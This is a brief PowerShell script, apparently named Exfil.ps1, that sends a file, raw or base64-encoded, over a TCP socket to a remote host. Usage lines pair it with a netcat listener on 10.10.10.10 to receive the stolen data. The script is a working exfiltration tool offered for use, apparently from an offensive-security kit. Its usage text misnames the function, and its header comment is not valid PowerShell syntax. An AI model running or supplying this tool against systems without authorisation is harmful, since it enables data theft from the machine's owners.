'''
Sends a file through a socket to be received by a listener on the target machine.
Run . .\Exfil.ps1 in the directory containing the file

Usage (plaintext):
Server: Send-EndcodeFile -Target 10.10.10.10 -Port 9001 -Path .\test.txt
Client: nc -nvlp 9001 > test.txt

Usage (base64-encoded):
Server: Send-EndcodeFile -Target 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded $true
Client: nc -nvlp 9001 > b64test.txt

'''
Function Send-EncodedFile () {
        
        param($Target, $Port, $Path, [bool[]]$Encoded=$false)
       
        $string = switch($Encoded){
                $true { [System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([io.file]::ReadAllBytes($Path))) }
                default { [io.file]::ReadAllBytes($Path) }
            }
        $socket = New-object System.Net.Sockets.TcpClient($Target,$Port)
        $stream = $socket.GetStream()
        $stream.Write($string, 0 ,$string.Length)
        $stream.close()
        $socket.close()
}
